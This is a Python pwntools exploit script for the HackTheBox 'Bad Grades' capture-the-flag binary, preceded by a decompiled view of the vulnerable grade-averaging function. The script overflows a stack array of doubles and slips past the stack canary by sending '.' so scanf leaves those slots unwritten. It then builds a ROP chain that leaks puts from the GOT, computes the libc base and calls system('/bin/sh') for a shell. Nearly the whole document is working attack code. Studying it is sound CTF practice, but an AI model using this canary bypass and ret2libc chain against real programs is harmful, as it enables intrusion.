'''
void FUN_00400fd5(void)

{
  long in_FS_OFFSET;
  int local_128;
  int local_124;
  double local_120;
  double local_118 [33];
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_120 = 0.0;
  FUN_00400acb(0,"Number of grades: ",&DAT_004012d8,&DAT_00401304);
  __isoc99_scanf(&DAT_0040137e,&local_128);
  for (local_124 = 0; local_124 < local_128; local_124 = local_124 + 1) {
    printf("Grade [%d]: ",(ulong)(local_124 + 1));
    __isoc99_scanf(&DAT_0040138e);
    local_120 = local_118[local_124] + local_120;
  }
  printf("Your new average is: %.2f\n");
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
'''
#!/usr/bin/python3

#https://shakuganz.com/2021/07/26/hackthebox-bad-grades-write-up/
#https://fdlucifer.github.io/2021/09/01/bad-grades/

from pwn import *
import struct

def hex_to_double(val):
	val = p64(val).hex()
	val = struct.unpack('d', bytes.fromhex(val))[0]
	return str(val)

elf = ELF('./bad_grades')
context.arch = 'amd64'

rop = ROP(elf)
io = process('./bad_grades')

ip, port = "127.0.0.1", 1234
#io = remote(ip, port)

io.sendlineafter('> ', '2')

'''
33x8 (array) + 8 (Canary) + 8 (rbp) + 8 (rip) + ... (rop-chain)
33 (padding) + 2 (canary+rbp) + 4 (rop) = 39
'''
io.sendlineafter('Number of grades: ', '39')

for i in range(35):
	io.sendline('.')

io.sendline(hex_to_double(rop.find_gadget(['pop rdi', 'ret'])[0]))
io.sendline(hex_to_double(elf.got['puts']))
io.sendline(hex_to_double(elf.plt['puts']))
io.sendline(hex_to_double(0x400fd5))

io.recvuntil('\n')
leaked_puts_addr = u64(io.recvuntil('\n').strip().ljust(8, b'\x00'))
log.info("Leaked server's libc address, puts(): "+hex(leaked_puts_addr))

libc = ELF('./libc.so.6')
libc.address = leaked_puts_addr - libc.symbols['puts']
log.info("Leaked server's libc base address: "+hex(libc.address))

rop_libc = ROP(libc)
io.sendlineafter('Number of grades: ', '39')

for i in range(35):
        io.sendline('.')

# put gadget with only "RET" by writing to index 35 which is a dummy gadget so that we have have stack alignment
io.sendline(hex_to_double(rop_libc.find_gadget(['ret'])[0]))
io.sendline(hex_to_double(rop_libc.find_gadget(['pop rdi', 'ret'])[0]))
io.sendline(hex_to_double(next(libc.search(b'/bin/sh\x00'))))
io.sendline(hex_to_double(libc.symbols['system']))

io.recvuntil('\n')
io.interactive()

